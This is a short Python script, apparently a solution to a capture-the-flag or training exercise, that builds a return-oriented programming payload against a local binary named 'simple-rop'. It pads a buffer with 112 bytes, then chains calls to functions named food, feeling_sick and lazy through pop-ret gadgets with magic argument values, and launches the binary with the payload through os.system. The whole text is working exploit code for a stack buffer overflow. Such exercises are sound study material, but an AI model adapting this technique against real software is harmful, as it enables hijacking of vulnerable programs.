import os
import struct

food = 0x8048490
pop_ret = 0x080484ed

feeling_sick = 0x80484ef
pop_pop_ret = 0x080484ec 

lazy = 0x804846b

# PAYLOAD
# [AA..AAA][food][pop_ret][0xdeadbeef][feeling_sick][pop_pop_ret][0xd15ea5e][0x0badf00d][lazy]

p = "A"*112

p += struct.pack("I",food)
p += struct.pack("I",pop_ret)
p += struct.pack("I",0xdeadbeef)

p += struct.pack("I",feeling_sick)
p += struct.pack("I",pop_pop_ret)
p += struct.pack("I",0xd15ea5e)
p += struct.pack("I",0x0badf00d)

p += struct.pack("I",lazy)

os.system("./simple-rop %s" % p)

